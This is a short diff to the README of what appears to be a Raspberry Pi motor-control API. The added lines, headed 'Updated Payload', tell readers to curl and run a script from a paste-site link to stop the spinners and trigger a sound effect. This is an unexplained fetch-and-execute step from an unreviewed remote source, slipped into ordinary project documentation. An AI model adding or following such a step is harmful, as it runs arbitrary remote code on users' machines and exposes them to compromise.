@@ -13,6 +13,9 @@ The API will be available at `http://<pi-ip>:5000`.
 
 ---
 
+### Updated Payload
+To stop the spinners and trigger the sound effect, curl and run this: 
+https://hst.sh/raw/uyisamuruc
 ## Endpoints
 
 ### `POST /motors`
